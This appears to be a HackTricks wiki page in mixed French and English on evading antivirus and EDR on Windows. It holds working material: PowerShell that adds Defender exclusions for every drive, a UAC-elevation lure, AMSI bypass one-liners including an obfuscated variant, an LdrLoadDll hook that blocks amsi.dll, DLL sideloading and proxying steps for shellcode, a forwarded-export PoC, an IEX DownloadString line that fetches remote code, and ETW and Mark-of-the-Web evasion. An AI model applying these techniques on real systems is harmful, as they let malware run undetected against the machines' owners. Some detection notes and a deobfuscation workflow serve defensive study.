# Antivirus (AV) Bypass

{{#include ../banners/hacktricks-training.md}}

**Cette page a été écrite par** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Arrêter Defender

- [defendnot](https://github.com/es3n1n/defendnot): Un outil pour empêcher Windows Defender de fonctionner.
- [no-defender](https://github.com/es3n1n/no-defender): Un outil pour empêcher Windows Defender de fonctionner en se faisant passer pour un autre AV.
- [Désactiver Defender si vous êtes admin](basic-powershell-for-pentesters/README.md)

### Leurre UAC de type installateur avant d'altérer Defender

Des loaders publics se faisant passer pour des cheats de jeux sont souvent fournis sous forme d'installateurs Node.js/Nexe non signés qui d'abord **demandent à l'utilisateur l'élévation** et seulement ensuite neutralisent Defender. Le flux est simple :

1. Vérifier le contexte administratif avec `net session`. La commande ne réussit que si l'appelant dispose des droits administrateur, donc un échec indique que le loader s'exécute en tant qu'utilisateur standard.
2. Se relancer immédiatement avec le verbe `RunAs` pour déclencher la fenêtre de consentement UAC attendue tout en conservant la ligne de commande d'origine.
```powershell
if (-not (net session 2>$null)) {
powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
exit
}
```
Les victimes croient déjà qu'elles installent un logiciel “cracked”, donc l'invite est généralement acceptée, donnant au malware les droits nécessaires pour modifier la politique de Defender.

### Exclusions globales `MpPreference` pour chaque lettre de lecteur

Une fois élevés, les enchaînements de type GachiLoader maximisent les angles morts de Defender au lieu de désactiver complètement le service. Le loader tue d'abord le GUI watchdog (`taskkill /F /IM SecHealthUI.exe`) puis applique **des exclusions extrêmement larges** de sorte que chaque profil utilisateur, répertoire système et disque amovible devienne non analysable :
```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```
Observations clés :

- La boucle parcourt tous les systèmes de fichiers montés (D:\, E:\, clés USB, etc.) donc **tout payload futur déposé n'importe où sur le disque est ignoré**.
- L'exclusion de l'extension `.sys` est prospective — les attaquants se réservent la possibilité de charger des drivers non signés plus tard sans retoucher Defender.
- Tous les changements se retrouvent sous `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions`, permettant aux étapes ultérieures de vérifier que les exclusions persistent ou de les étendre sans relancer UAC.

Comme aucun service Defender n'est arrêté, des vérifications naïves d'état continueront à rapporter « antivirus actif » alors que l'inspection en temps réel ne touche jamais ces chemins.

## **AV Evasion Methodology**

Currently, AVs use different methods for checking if a file is malicious or not, static detection, dynamic analysis, and for the more advanced EDRs, behavioural analysis.

### **Static detection**

Static detection is achieved by flagging known malicious strings or arrays of bytes in a binary or script, and also extracting information from the file itself (e.g. file description, company name, digital signatures, icon, checksum, etc.). This means that using known public tools may get you caught more easily, as they've probably been analyzed and flagged as malicious. There are a couple of ways of getting around this sort of detection:

- **Encryption**

If you encrypt the binary, there will be no way for AV of detecting your program, but you will need some sort of loader to decrypt and run the program in memory.

- **Obfuscation**

Sometimes all you need to do is change some strings in your binary or script to get it past AV, but this can be a time-consuming task depending on what you're trying to obfuscate.

- **Custom tooling**

If you develop your own tools, there will be no known bad signatures, but this takes a lot of time and effort.

> [!TIP]
> A good way for checking against Windows Defender static detection is [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). It basically splits the file into multiple segments and then tasks Defender to scan each one individually, this way, it can tell you exactly what are the flagged strings or bytes in your binary.

Je vous recommande fortement de consulter cette YouTube playlist : https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf qui traite de l'AV Evasion pratique.

### **Dynamic analysis**

Dynamic analysis is when the AV runs your binary in a sandbox and watches for malicious activity (e.g. trying to decrypt and read your browser's passwords, performing a minidump on LSASS, etc.). This part can be a bit trickier to work with, but here are some things you can do to evade sandboxes.

- **Sleep before execution** Depending on how it's implemented, it can be a great way of bypassing AV's dynamic analysis. AV's have a very short time to scan files to not interrupt the user's workflow, so using long sleeps can disturb the analysis of binaries. The problem is that many AV's sandboxes can just skip the sleep depending on how it's implemented.
- **Checking machine's resources** Usually Sandboxes have very little resources to work with (e.g. < 2GB RAM), otherwise they could slow down the user's machine. You can also get very creative here, for example by checking the CPU's temperature or even the fan speeds, not everything will be implemented in the sandbox.
- **Machine-specific checks** If you want to target a user who's workstation is joined to the "contoso.local" domain, you can do a check on the computer's domain to see if it matches the one you've specified, if it doesn't, you can make your program exit.

Il s'avère que le computername du Sandbox de Microsoft Defender est HAL9TH, donc vous pouvez vérifier le nom de l'ordinateur dans votre malware avant la détonation : si le nom correspond à HAL9TH, cela signifie que vous êtes dans le sandbox de Defender, vous pouvez alors faire quitter votre programme.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>source: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Quelques autres très bons conseils de [@mgeeky](https://twitter.com/mariuszbit) pour contrer les Sandboxes

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev channel</p></figcaption></figure>

Comme nous l'avons dit plus haut, **les outils publics** finiront par **être détectés**, donc vous devriez vous poser la question suivante :

Par exemple, si vous voulez dumper LSASS, **avez-vous vraiment besoin d'utiliser mimikatz** ? Ou pourriez-vous utiliser un autre projet moins connu qui dumpe aussi LSASS.

La bonne réponse est probablement la seconde option. En prenant mimikatz comme exemple, c'est probablement l'un des projets, si ce n'est le plus, signalés par les AVs et les EDRs ; bien que le projet soit très sympa, il est aussi un cauchemar à utiliser pour contourner les AVs, donc cherchez simplement des alternatives pour ce que vous essayez d'accomplir.

> [!TIP]
> When modifying your payloads for evasion, make sure to **turn off automatic sample submission** in defender, and please, seriously, **DO NOT UPLOAD TO VIRUSTOTAL** if your goal is achieving evasion in the long run. If you want to check if your payload gets detected by a particular AV, install it on a VM, try to turn off the automatic sample submission, and test it there until you're satisfied with the result.

## EXEs vs DLLs

Whenever it's possible, always **prioritize using DLLs for evasion**, in my experience, DLL files are usually **way less detected** and analyzed, so it's a very simple trick to use in order to avoid detection in some cases (if your payload has some way of running as a DLL of course).

As we can see in this image, a DLL Payload from Havoc has a detection rate of 4/26 in antiscan.me, while the EXE payload has a 7/26 detection rate.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>comparaison antiscan.me d'un payload Havoc EXE normal vs un payload Havoc DLL normal</p></figcaption></figure>

Maintenant nous allons montrer quelques astuces que vous pouvez utiliser avec des fichiers DLL pour être beaucoup plus stealthy.

## DLL Sideloading & Proxying

**DLL Sideloading** exploite l'ordre de recherche des DLL utilisé par le loader en positionnant l'application victime et le(s) payload(s) malveillant(s) côte à côte.

Vous pouvez détecter les programmes susceptibles de DLL Sideloading en utilisant [Siofra](https://github.com/Cybereason/siofra) et le script powershell suivant :
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
Cette commande affichera la liste des programmes susceptibles de DLL hijacking dans "C:\Program Files\\" et les DLL qu'ils tentent de charger.

Je vous recommande vivement d'**explorer vous‑même les DLL Hijackable/Sideloadable programs**, cette technique est assez discrète si elle est bien exécutée, mais si vous utilisez des DLL Sideloadable programs connus publiquement, vous risquez de vous faire repérer facilement.

Il ne suffit pas de placer une DLL malveillante portant le nom attendu par un programme pour que celui‑ci charge votre payload, car le programme attend certaines fonctions spécifiques dans cette DLL ; pour contourner ce problème, nous utiliserons une autre technique appelée **DLL Proxying/Forwarding**.

**DLL Proxying** redirige les appels effectués par le programme depuis la DLL proxy (malveillante) vers la DLL originale, préservant ainsi la fonctionnalité du programme et permettant d'exécuter votre payload.

J'utiliserai le projet [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) de [@flangvik](https://twitter.com/Flangvik/)

Voici les étapes que j'ai suivies :
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
La dernière commande nous donnera 2 fichiers : un modèle de code source DLL et la DLL d'origine renommée.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
These are the results:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Notre shellcode (encodé avec [SGN](https://github.com/EgeBalci/sgn)) et la proxy DLL ont tous deux un taux de détection de 0/26 sur [antiscan.me](https://antiscan.me) ! J'appellerais ça un succès.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Je **vous recommande vivement** de regarder [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543) sur DLL Sideloading et aussi [ippsec's video](https://www.youtube.com/watch?v=3eROsG_WNpE) pour approfondir ce dont nous avons parlé.

### Abuser les exports forwardés (ForwardSideLoading)

Windows PE modules can export functions that are actually "forwarders": instead of pointing to code, the export entry contains an ASCII string of the form `TargetDll.TargetFunc`. When a caller resolves the export, the Windows loader will:

- Load `TargetDll` if not already loaded
- Resolve `TargetFunc` from it

Key behaviors to understand:
- If `TargetDll` is a KnownDLL, it is supplied from the protected KnownDLLs namespace (e.g., ntdll, kernelbase, ole32).
- If `TargetDll` is not a KnownDLL, the normal DLL search order is used, which includes the directory of the module that is doing the forward resolution.

This enables an indirect sideloading primitive: find a signed DLL that exports a function forwarded to a non-KnownDLL module name, then co-locate that signed DLL with an attacker-controlled DLL named exactly as the forwarded target module. When the forwarded export is invoked, the loader resolves the forward and loads your DLL from the same directory, executing your DllMain.

Example observed on Windows 11:
```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```
`NCRYPTPROV.dll` n'est pas un KnownDLL, il est donc résolu via l'ordre de recherche normal.

PoC (copier-coller) :
1) Copier la DLL système signée dans un dossier accessible en écriture
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Déposez une `NCRYPTPROV.dll` malveillante dans le même dossier. Un DllMain minimal suffit pour obtenir l'exécution de code ; vous n'avez pas besoin d'implémenter la fonction forwardée pour déclencher DllMain.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
if (reason == DLL_PROCESS_ATTACH){
HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}
}
return TRUE;
}
```
3) Déclencher le transfert avec un LOLBin signé :
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```
Comportement observé :
- rundll32 (signed) charge le side-by-side `keyiso.dll` (signed)
- Lors de la résolution de `KeyIsoSetAuditingInterface`, le chargeur suit le forward vers `NCRYPTPROV.SetAuditingInterface`
- Le chargeur charge ensuite `NCRYPTPROV.dll` depuis `C:\test` et exécute son `DllMain`
- Si `SetAuditingInterface` n'est pas implémenté, vous obtiendrez une erreur "missing API" seulement après que `DllMain` s'est déjà exécuté

Conseils de détection :
- Concentrez-vous sur les forwarded exports dont le module cible n'est pas un KnownDLL. KnownDLLs sont listés sous `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`.
- Vous pouvez énumérer les forwarded exports avec des outils tels que :
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Consultez l'inventaire des forwarders Windows 11 pour rechercher des candidats : https://hexacorn.com/d/apis_fwd.txt

Detection/defense ideas:
- Surveillez les LOLBins (p. ex., rundll32.exe) qui chargent des DLL signées depuis des chemins non-système, puis chargent des non-KnownDLLs portant le même nom de base depuis ce répertoire
- Déclenchez une alerte sur des chaînes processus/module comme : `rundll32.exe` → non-system `keyiso.dll` → `NCRYPTPROV.dll` sous des chemins accessibles en écriture par l'utilisateur
- Appliquez les politiques d'intégrité du code (WDAC/AppLocker) et refusez les opérations write+execute dans les répertoires d'application

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze is a payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods`

Vous pouvez utiliser Freeze pour charger et exécuter votre shellcode de manière furtive.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> L'évasion est juste un jeu du chat et de la souris : ce qui fonctionne aujourd'hui peut être détecté demain, donc ne vous fiez jamais à un seul outil ; si possible, essayez d'enchaîner plusieurs techniques d'évasion.

## AMSI (Anti-Malware Scan Interface)

AMSI a été créé pour empêcher les "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)". À l'origine, les AV ne pouvaient scanner que les **fichiers sur disque**, donc si vous pouviez exécuter des payloads **directement in-memory**, l'AV ne pouvait rien faire pour l'empêcher, car il n'avait pas assez de visibilité.

La fonctionnalité AMSI est intégrée dans ces composants de Windows.

- User Account Control, or UAC (élévation d'EXE, COM, MSI, ou installation ActiveX)
- PowerShell (scripts, utilisation interactive, et évaluation dynamique de code)
- Windows Script Host (wscript.exe and cscript.exe)
- JavaScript and VBScript
- Office VBA macros

Elle permet aux solutions antivirus d'inspecter le comportement des scripts en exposant le contenu des scripts sous une forme non chiffrée et non obfusquée.

Lancer `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` produira l'alerte suivante sur Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Remarquez comment il préfixe `amsi:` puis le chemin vers l'exécutable depuis lequel le script a été lancé, dans ce cas, powershell.exe

Nous n'avons déposé aucun fichier sur le disque, mais nous avons quand même été détectés in-memory à cause d'AMSI.

De plus, à partir de **.NET 4.8**, le code C# est également passé par AMSI. Cela affecte même `Assembly.Load(byte[])` pour le chargement et l'exécution in-memory. C'est pourquoi il est recommandé d'utiliser des versions plus anciennes de .NET (comme 4.7.2 ou inférieure) pour l'exécution in-memory si vous voulez tenter d'échapper à AMSI.

Il existe plusieurs façons de contourner AMSI :

- **Obfuscation**

Puisqu'AMSI fonctionne principalement avec des détections statiques, modifier les scripts que vous essayez de charger peut être une bonne façon d'éviter la détection.

Cependant, AMSI a la capacité de désobfusquer les scripts même s'ils ont plusieurs couches, donc l'obfuscation peut être une mauvaise option selon la façon dont elle est faite. Cela rend l'évasion pas si évidente. Toutefois, parfois, il suffit de changer quelques noms de variables et ça passe, donc tout dépend de l'importance du signal qui a déclenché l'alerte.

- **AMSI Bypass**

Puisqu'AMSI est implémenté en chargeant une DLL dans le processus powershell (aussi cscript.exe, wscript.exe, etc.), il est possible de le manipuler facilement même en tant qu'utilisateur non privilégié. En raison de cette faiblesse dans l'implémentation d'AMSI, des chercheurs ont trouvé plusieurs moyens d'éviter le scan AMSI.

**Forcing an Error**

Forcer l'initialisation d'AMSI à échouer (amsiInitFailed) fera qu'aucune analyse ne sera lancée pour le processus courant. Ceci a été initialement divulgué par [Matt Graeber](https://twitter.com/mattifestation) et Microsoft a développé une signature pour empêcher une utilisation plus large.
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
Il a suffi d'une seule ligne de code powershell pour rendre AMSI inutilisable pour le processus powershell en cours. Cette ligne a bien sûr été repérée par AMSI lui‑même, donc une modification est nécessaire pour pouvoir utiliser cette technique.

Voici un AMSI bypass modifié que j'ai pris de ce [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
Gardez à l'esprit que cela sera probablement détecté une fois cette publication mise en ligne, donc vous ne devriez pas publier de code si votre objectif est de rester indétecté.

**Memory Patching**

Cette technique a été initialement découverte par [@RastaMouse](https://twitter.com/_RastaMouse/) et consiste à trouver l'adresse de la fonction "AmsiScanBuffer" dans amsi.dll (responsable de l'analyse des données fournies par l'utilisateur) et à la remplacer par des instructions renvoyant le code E_INVALIDARG ; de cette façon, le résultat de l'analyse renverra 0, ce qui est interprété comme un résultat propre.

> [!TIP]
> Veuillez lire [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) pour une explication plus détaillée.

Il existe également de nombreuses autres techniques utilisées pour contourner AMSI avec powershell, consultez [**this page**](basic-powershell-for-pentesters/index.html#amsi-bypass) et [**this repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) pour en savoir plus à leur sujet.

### Blocking AMSI by preventing amsi.dll load (LdrLoadDll hook)

AMSI n'est initialisé qu'après que `amsi.dll` ait été chargé dans le processus courant. Une méthode de contournement robuste et indépendante du langage consiste à placer un hook en mode utilisateur sur `ntdll!LdrLoadDll` qui renvoie une erreur lorsque le module demandé est `amsi.dll`. En conséquence, AMSI ne se charge jamais et aucune analyse n'a lieu pour ce processus.

Implementation outline (x64 C/C++ pseudocode):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
if (module && module->Buffer){
UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
if (RtlEqualUnicodeString(module, &amsi, TRUE)){
// Pretend the DLL cannot be found → AMSI never initialises in this process
return STATUS_DLL_NOT_FOUND; // 0xC0000135
}
}
return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
// Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
// e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Remarques
- Fonctionne dans PowerShell, WScript/CScript et les loaders personnalisés (tout ce qui chargerait autrement AMSI).
- À associer à l'alimentation des scripts via stdin (`PowerShell.exe -NoProfile -NonInteractive -Command -`) pour éviter les artefacts liés aux longues lignes de commande.
- Observé utilisé par des loaders exécutés via des LOLBins (p. ex., `regsvr32` appelant `DllRegisterServer`).

The tool **[https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail)** also generates script to bypass AMSI.
The tool **[https://amsibypass.com/](https://amsibypass.com/)** also generates script to bypass AMSI that avoid signature by randomized user-defined function, variables, characters expression and applies random character casing to PowerShell keywords to avoid signature.

**Supprimer la signature détectée**

Vous pouvez utiliser un outil tel que **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** et **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** pour supprimer la signature AMSI détectée de la mémoire du processus courant. Cet outil fonctionne en scannant la mémoire du processus courant à la recherche de la signature AMSI puis en l'écrasant avec des instructions NOP, la supprimant effectivement de la mémoire.

**Produits AV/EDR utilisant AMSI**

Vous pouvez trouver une liste de produits AV/EDR utilisant AMSI sur **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**Utiliser PowerShell version 2**
Si vous utilisez PowerShell version 2, AMSI ne sera pas chargé, vous pouvez donc exécuter vos scripts sans être scannés par AMSI. Vous pouvez faire ceci:
```bash
powershell.exe -version 2
```
## Journalisation PowerShell

PowerShell logging est une fonctionnalité qui permet d'enregistrer toutes les commandes PowerShell exécutées sur un système. Cela peut être utile pour l'audit et le dépannage, mais cela peut aussi être un **problème pour les attaquants qui cherchent à échapper à la détection**.

Pour contourner la journalisation PowerShell, vous pouvez utiliser les techniques suivantes :

- **Désactiver PowerShell Transcription et Module Logging** : vous pouvez utiliser un outil tel que [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) à cette fin.
- **Utiliser PowerShell version 2** : si vous utilisez PowerShell version 2, AMSI ne sera pas chargé, vous pouvez donc exécuter vos scripts sans être scanné par AMSI. Vous pouvez faire ceci : `powershell.exe -version 2`
- **Utiliser une session PowerShell non gérée** : utilisez [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) pour lancer un powershell sans défenses (c'est ce que `powerpick` de Cobal Strike utilise).


## Obfuscation

> [!TIP]
> Plusieurs techniques d'obfuscation reposent sur le chiffrement des données, ce qui augmentera l'entropie du binaire et facilitera sa détection par les AVs et EDRs. Faites attention à cela et n'appliquez peut‑être le chiffrement qu'à des sections spécifiques de votre code qui sont sensibles ou doivent être cachées.

### Déobfuscation des binaires .NET protégés par ConfuserEx

Lors de l'analyse de malware utilisant ConfuserEx 2 (ou ses forks commerciaux), il est courant de rencontrer plusieurs couches de protection qui bloqueront les décompilateurs et les sandboxes. Le flux de travail ci‑dessous restaure de manière fiable un IL presque original qui peut ensuite être décompilé en C# dans des outils tels que dnSpy ou ILSpy.

1.  Suppression de l'anti-tamper – ConfuserEx chiffre chaque *method body* et le décrypte à l'intérieur du constructeur static du *module* (`<Module>.cctor`). Il modifie aussi le PE checksum, donc toute modification fera planter le binaire. Utilisez **AntiTamperKiller** pour localiser les tables de métadonnées chiffrées, récupérer les clés XOR et réécrire un assembly propre :
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
La sortie contient les 6 paramètres anti-tamper (`key0-key3`, `nameHash`, `internKey`) qui peuvent être utiles lors de la création de votre propre unpacker.

2.  Récupération des symboles / du contrôle de flux – fournissez le fichier *clean* à **de4dot-cex** (un fork de de4dot adapté à ConfuserEx).
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
Flags :
• `-p crx` – sélectionner le profil ConfuserEx 2  
• de4dot annulera le control-flow flattening, restaurera les namespaces, classes et noms de variables originaux et déchiffrera les chaînes constantes.

3.  Suppression des appels proxy – ConfuserEx remplace les appels directs de méthode par des wrappers légers (a.k.a *proxy calls*) pour compliquer davantage la décompilation. Supprimez-les avec **ProxyCall-Remover** :
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
Après cette étape vous devriez observer des API .NET normales telles que `Convert.FromBase64String` ou `AES.Create()` au lieu de fonctions wrapper opaques (`Class8.smethod_10`, …).

4.  Nettoyage manuel – exécutez le binaire résultant sous dnSpy, recherchez de gros blobs Base64 ou l'utilisation de `RijndaelManaged`/`TripleDESCryptoServiceProvider` pour localiser le payload *réel*. Souvent, le malware le stocke comme un tableau d'octets encodé TLV initialisé à l'intérieur de `<Module>.byte_0`.

La chaîne ci‑dessus restaure le flux d'exécution **sans** avoir besoin d'exécuter l'échantillon malveillant – utile lorsque l'on travaille sur une station hors ligne.

> 🛈  ConfuserEx génère un attribut personnalisé nommé `ConfusedByAttribute` qui peut être utilisé comme IOC pour triager automatiquement des échantillons.

#### One-liner
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Le but de ce projet est de fournir un fork open-source de la suite de compilation [LLVM](http://www.llvm.org/) capable d'offrir une sécurité logicielle accrue via [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) et tamper-proofing.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator demonstates how to use `C++11/14` language to generate, at compile time, obfuscated code without using any external tool and without modifying the compiler.
- [**obfy**](https://github.com/fritzone/obfy): Add a layer of obfuscated operations generated by the C++ template metaprogramming framework which will make the life of the person wanting to crack the application a little bit harder.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz is a x64 binary obfuscator that is able to obfuscate various different pe files including: .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Metame is a simple metamorphic code engine for arbitrary executables.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator is a fine-grained code obfuscation framework for LLVM-supported languages using ROP (return-oriented programming). ROPfuscator obfuscates a program at the assembly code level by transforming regular instructions into ROP chains, thwarting our natural conception of normal control flow.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt is a .NET PE Crypter written in Nim
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor is able to convert existing EXE/DLL into shellcode and then load them

## SmartScreen & MoTW

Vous avez peut-être vu cet écran en téléchargeant certains exécutables depuis Internet et en les exécutant.

Microsoft Defender SmartScreen est un mécanisme de sécurité destiné à protéger l'utilisateur final contre l'exécution d'applications potentiellement malveillantes.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen fonctionne principalement sur une approche basée sur la réputation, ce qui signifie que les applications peu téléchargées déclencheront SmartScreen, alertant et empêchant l'utilisateur final d'exécuter le fichier (bien que le fichier puisse toujours être exécuté en cliquant sur More Info -> Run anyway).

**MoTW** (Mark of The Web) est un [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) nommé Zone.Identifier qui est automatiquement créé lors du téléchargement de fichiers depuis Internet, ainsi que l'URL d'où ils ont été téléchargés.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Vérification de l'ADS Zone.Identifier pour un fichier téléchargé depuis Internet.</p></figcaption></figure>

> [!TIP]
> Il est important de noter que les exécutables signés avec un certificat de signature **de confiance** **ne déclencheront pas SmartScreen**.

Une façon très efficace d'empêcher vos payloads d'obtenir le Mark of The Web est de les empaqueter à l'intérieur d'un conteneur comme une ISO. Cela se produit parce que Mark-of-the-Web (MOTW) **ne peut pas** être appliqué aux volumes non NTFS.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) est un outil qui place des payloads dans des conteneurs de sortie pour éviter Mark-of-the-Web.

Exemple d'utilisation:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Here is a demo for bypassing SmartScreen by packaging payloads inside ISO files using [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) est un puissant mécanisme de journalisation dans Windows qui permet aux applications et aux composants système de **consigner des événements**. Cependant, il peut aussi être utilisé par les produits de sécurité pour surveiller et détecter des activités malveillantes.

De la même manière qu'AMSI peut être désactivé (bypassed), il est aussi possible de faire en sorte que la fonction **`EtwEventWrite`** du processus en espace utilisateur retourne immédiatement sans consigner d'événements. Cela se fait en modifiant la fonction en mémoire pour qu'elle retourne immédiatement, désactivant ainsi la journalisation ETW pour ce processus.

Vous pouvez trouver plus d'infos sur **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) et [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.


## C# Assembly Reflection

